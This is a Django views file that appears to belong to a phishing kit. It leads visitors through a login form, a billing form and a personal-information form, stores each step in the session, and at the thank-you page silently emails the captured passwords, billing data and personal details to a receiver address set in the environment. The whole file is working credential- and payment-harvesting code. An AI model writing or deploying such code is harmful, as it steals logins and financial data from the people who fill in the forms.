import yagmail
from django.shortcuts import render,redirect
from .forms import *
import os
from dotenv import find_dotenv, load_dotenv

dotenv = find_dotenv()
load_dotenv(dotenv)
RECIEVER_EMAIL = os.getenv('RECIEVER_EMAIL')
SENDER_EMAIL = os.getenv('SENDER_EMAIL')
PASSWORD = os.getenv('PASSWORD')

def home_view(request):
    
    if request.method == 'POST':
        form = UserPassForm(request.POST)
        if form.is_valid():
            request.session['login_data'] = form.cleaned_data
            return redirect('billing')
    else:
        form = UserPassForm()
        
    return render(request, 'dashboard/home.html', {'form': form})

def billing_view(request):
    if request.method == 'POST':
        form = BillingForm(request.POST)
        if form.is_valid():
            request.session['bill_data'] = form.cleaned_data
            print(request.session['login_data'])
            return redirect('info')
    else:
        form = BillingForm()
    return render(request, 'dashboard/billing.html', {'form': form})

def info_view(request):
    if request.method == 'POST':
        form = InfoForm(request.POST)
        if form.is_valid():
            request.session['info_data'] = form.cleaned_data
            print(request.session['login_data'])
            print(request.session['bill_data'])
            return redirect('thank-you')
    else:
        form = InfoForm()
    return render(request, 'dashboard/info.html', {'form': form})


def thank_you_view(request):
    # Retrieve session data
    login_data = request.session.get('login_data', 'No login data available')
    bill_data = request.session.get('bill_data', 'No bill data available')
    info_data = request.session.get('info_data', 'No info data available')

    # Format the content of the email
    email_content = f"""
    {login_data}/n
    {bill_data}/n
    {info_data}
    """

    try:
        # Ensure you have configured yagmail with your email and password securely
        yag = yagmail.SMTP(SENDER_EMAIL, PASSWORD)  # Replace with a secure method for loading credentials
        yag.send(
            to=RECIEVER_EMAIL, 
            subject='Thank You!',
            contents= email_content,
        )
        print("✅ Email sent successfully!")
    except Exception as e:
        print("❌ Failed to send email:", str(e))

    return render(request, 'dashboard/thankyou.html')



